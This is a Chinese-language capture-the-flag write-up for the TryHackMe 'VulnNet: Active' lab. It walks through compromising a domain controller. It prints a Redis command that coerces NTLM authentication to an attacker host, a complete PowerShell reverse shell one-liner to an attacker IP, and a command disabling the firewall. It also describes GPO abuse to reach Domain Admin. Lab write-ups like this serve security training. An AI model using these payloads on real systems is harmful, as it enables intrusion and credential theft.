# VulnNet: Active

VulnNet Entertainment在他们以前的网络中遇到了不好的时光，该网络遭受了多次破坏。现在，他们移动了整个基础架构，并再次聘请您作为核心渗透测试人员。您的目标是获得对系统的完全访问权限并破坏域。

---

**这应该是我在thm打的最后一个中等难度的域渗透房间了，因为剩下的ad渗透都是定位：难 的房间**

**经验之谈：非官方的单域渗透靶机往往都有卡死、非常卡的问题，遇到不对劲直接重启靶机就完事了**

---

## 端口扫描

循例 nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/54787b253d354f15adde747f79ed0f58.png)

## 简单主动侦察

使用enum4linux:

	enum4linux -a 10.10.134.253

这里能看到域名, 但不完整

![在这里插入图片描述](https://img-blog.csdnimg.cn/0d3ecec3816a41f295e3b690545a9db9.png)

再使用crackmapexec：

![在这里插入图片描述](https://img-blog.csdnimg.cn/97fab9d1be444e11ace83a891788a3d0.png)

	vulnnet.local

### smb

smb这里也没东西

![在这里插入图片描述](https://img-blog.csdnimg.cn/149b6e9027df427badfae337a2b48a75.png)

## Redis枚举

在上面的端口扫描结果中有一个亮眼的端口就是6379，nmap显示这是redis

![在这里插入图片描述](https://img-blog.csdnimg.cn/d3fb98794a284838a859c53566481b2b.png)

成功连上

但我目前对redis还较为薄弱，thm上有一个redis房间，过段时间再去看看

通过搜索引擎能够找到有关redis读取文件的文章：

![在这里插入图片描述](https://img-blog.csdnimg.cn/a0bdae71a8554a53b32a7452e6ac7572.png)

## NTLM 回传攻击

**NTLM回传攻击在thm的域渗透教程中都是有教过的**

通过这个命令能够进行文件读取，由于这里是在域内，思路就是利用这个点，然后访问攻击者开启的**薄弱**smb服务，然后redis这里就会去尝试进行ntlm身份验证，而攻击者也将获取该账户的ntlm hash

这个思路应该是没有问题的，来尝试一下

使用responder开启服务：

	responder -I tun0

redis执行文件读取：

	redis-cli -h 10.10.254.117 eval "dofile('//10.14.39.48//hack')" 0

![在这里插入图片描述](https://img-blog.csdnimg.cn/f868617803374e31ba67fca283b8939f.png)

使用haiti帮助我们快速找到hashcat的类型值

![在这里插入图片描述](https://img-blog.csdnimg.cn/15fedf7aeb4c4de9a15dc4d702e36b12.png)

hashcat直接爆

![在这里插入图片描述](https://img-blog.csdnimg.cn/175d79f41fac4b5d928ed7bd4db3b553.png)

## SMB枚举

现在我们有了一组初始凭据，做的第一件事当然是回去smb看看有没有什么信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/bd41f759595a41cf8a6bc7d15fb67624.png)

在Enterprise-Share里发现一个powershell脚本

![在这里插入图片描述](https://img-blog.csdnimg.cn/78cd42bbaaf24875ac29afd7037f6166.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/285e4f616cf34ab5aefcd50d4e821c71.png)

从这个文件名PurgeIrrelevantData和其内容，很容易能猜测到这可能是个定时脚本

我们可以尝试利用其来reverse shell，payload:

	$client = New-Object System.Net.Sockets.TCPClient('10.14.39.48',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

![在这里插入图片描述](https://img-blog.csdnimg.cn/dc3f438abe4b4cecb8b1658b420ffaeb.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/fdc7e110602841939186f1d0bdaccd3e.png)

nc监听

![在这里插入图片描述](https://img-blog.csdnimg.cn/02d537d763d241b59487a55a6e14a648.png)

getshell

## 本地提权

看到该账户有个SeImpersonatePrivilege

![在这里插入图片描述](https://img-blog.csdnimg.cn/d3c0663cb5e844da8b966129709cb132.png)

直接上msf

![在这里插入图片描述](https://img-blog.csdnimg.cn/00fee69cc2544b7c91b335b2103c2c63.png)

一键开启rdp

![在这里插入图片描述](https://img-blog.csdnimg.cn/244b45b2cf5a4b8baf297941f9e34464.png)

dc这里是有防火墙拦截，所以先把防火墙关了

	netsh advfirewall set allprofiles state off

![在这里插入图片描述](https://img-blog.csdnimg.cn/30c917bd69f44f1ea0b6a9292b1f2cd5.png)

将我们的账户加入本地管理员组，同时进入rdp

![在这里插入图片描述](https://img-blog.csdnimg.cn/f4be6d5e17b6442d83b04b958847e530.png)

## AD枚举

查看administrator账户，我们会发现它是LA和DA

![在这里插入图片描述](https://img-blog.csdnimg.cn/f8a3cb446a85448e87af6284fe285981.png)

**虽然我们现在已经彻底拿下了这个DC，但我希望能借此为数不多的域渗透靶机来练习thm所教导的知识**，在这里，我将练习sharphound

先开启smbserver

![在这里插入图片描述](https://img-blog.csdnimg.cn/8e709178a08c4f058684d6c4238e4265.png)

目标连接

![在这里插入图片描述](https://img-blog.csdnimg.cn/a0c1a40f01544340bee99617bcc665cc.png)

### SharpHound

跑sharphound

![在这里插入图片描述](https://img-blog.csdnimg.cn/24230a65a4c74cb7a24e91d7a848e145.png)

通过刚刚打开的smbserver将扫描结果传回

![在这里插入图片描述](https://img-blog.csdnimg.cn/949fd7ca01bd4990a14cdbbe64814ebd.png)

### BloodHound

开启neo4j

	neo4j console

启动bloodhound，并将zip丢进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/5861533bee7e4b2095a086be73a209d8.png)

我们利用路径搜索，从我们当前的账户到Domain Admins组有这么一条路径

![在这里插入图片描述](https://img-blog.csdnimg.cn/7cae14b8d28c4d40afaa058ce0a00d2f.png)

## AD利用

我们发现我们当前账户有权对security-pol这个gpo进行修改

那么我们将利用它

在rdp中打开mmc

![在这里插入图片描述](https://img-blog.csdnimg.cn/33c3acff60f643c2b376369d1d43b37a.png)

在用户配置->控制面板设置 新建即时任务

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f0b0c9ec0e64e5aafab6bb9f4b2b7b0.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/b03fcaac63e040fd9824c95395f68b4e.png)


将我们的账户添加到DA组

![在这里插入图片描述](https://img-blog.csdnimg.cn/2b060897c4964cb081243e3bae21993b.png)


弄好之后使用gpupdate /force强制立即更新组策略

![在这里插入图片描述](https://img-blog.csdnimg.cn/8b5e258ad39740738c69f8170ebfa6e1.png)

此时，我们已经是DA

![在这里插入图片描述](https://img-blog.csdnimg.cn/629d1eb223904b398f7de6de8fb63dd0.png)

游戏结束
